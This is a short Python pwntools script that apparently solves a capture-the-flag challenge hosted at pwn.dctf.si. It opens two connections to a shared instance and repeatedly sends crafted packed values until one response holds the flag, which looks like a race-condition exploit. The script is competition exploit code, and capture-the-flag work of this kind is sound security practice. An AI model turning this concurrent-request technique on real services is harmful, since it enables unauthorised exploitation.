from pwn import *
import time

ip = 'pwn.dctf.si'
port = 13376

p1 = remote(ip, port)
p2 = remote(ip, port)

# connect

p1.recvuntil(b'> ')
p1.sendline(b'1')
p1.recvuntil(b'Created instance with id: ')

id = p1.recvline().decode()[:36]
print(id)

p2.recvuntil(b'> ')
p2.sendline(b'2')
p2.recvuntil(b'Enter instance id: ')
time.sleep(1)
p2.sendline(id.encode())
p2.recvline()
p2.sendline(p64(0x1337c0de))
p2.recvline()

# exploit

i = 0
while True:
	print(i, end='\r')
	p1.sendline(p64(0x1337c0de))
	p2.sendline(p64(0xdeadc0de))
	out1 = p1.recvline()
	out2 = p2.recvline()
	if b'DCTF' in out1:
		print(i, str(out1)[2:-3])
		break
	if b'DCTF' in out2:
		print(i, str(out2)[2:-3])
		break
	i += 1

p1.close()
p2.close()
